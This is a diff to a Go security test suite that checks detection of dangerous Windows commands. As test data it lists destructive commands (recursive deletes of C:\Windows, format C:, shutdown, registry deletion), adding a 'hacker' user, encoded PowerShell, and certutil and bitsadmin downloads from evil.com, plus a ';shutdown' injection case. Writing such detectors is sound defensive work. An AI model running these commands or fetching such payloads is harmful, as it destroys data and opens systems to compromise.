@@ -23,22 +23,24 @@ func (suite *SecurityTestSuite) SetupSuite() {
 }
 
 // TestDangerousCommandDetection 测试危险命令检测（Windows专用）
+// 更新为符合新的宽松黑名单策略
 func (suite *SecurityTestSuite) TestDangerousCommandDetection() {
 	dangerousCommands := []string{
-		"del /s /q C:\\Windows",
-		"format C:",
-		"shutdown /s",
-		"shutdown /r",
-		"rd /s /q C:\\Important",
-		"rmdir /s /q C:\\Data",
-		"diskpart",
-		"Stop-Computer",
-		"Restart-Computer",
-		"takeown /f C:\\Windows",
-		"net user hacker /add",
-		"reg delete HKLM\\Software",
-		"bitsadmin /transfer",
-		"powershell -enc",
+		"del /f /s /q C:\\Windows",   // 递归强制删除
+		"del /s /f C:\\Windows",      // 递归强制删除（参数顺序不同）
+		"format C:",                  // 格式化磁盘
+		"shutdown /s",                // 关机
+		"shutdown /r",                // 重启
+		"rd /s /q C:\\Important",     // 递归删除目录
+		"rmdir /s /q C:\\Data",       // 递归删除目录
+		"diskpart",                   // 磁盘分区工具
+		"Stop-Computer",              // PowerShell关机
+		"Restart-Computer",           // PowerShell重启
+		"net user hacker /add",       // 添加用户
+		"reg delete HKLM\\Software",  // 删除注册表
+		"powershell -enc base64code", // 编码命令执行
+		"certutil -urlcache -f http://evil.com/malware.exe", // 下载恶意文件
+		"bitsadmin /transfer job http://evil.com/file.exe",  // 下载文件
 	}
 
 	for _, cmd := range dangerousCommands {
@@ -124,8 +126,8 @@ func (suite *SecurityTestSuite) TestEdgeCases() {
 		{"", false},
 		{"   ", false},
 		{"echo", false},
-		{"shutdown", true},
-		{";shutdown /s", true},
+		{"shutdown /s", true},  // 带参数的shutdown是危险的
+		{";shutdown /s", true}, // 命令注入
 	}
 
 	for _, tc := range testCases {
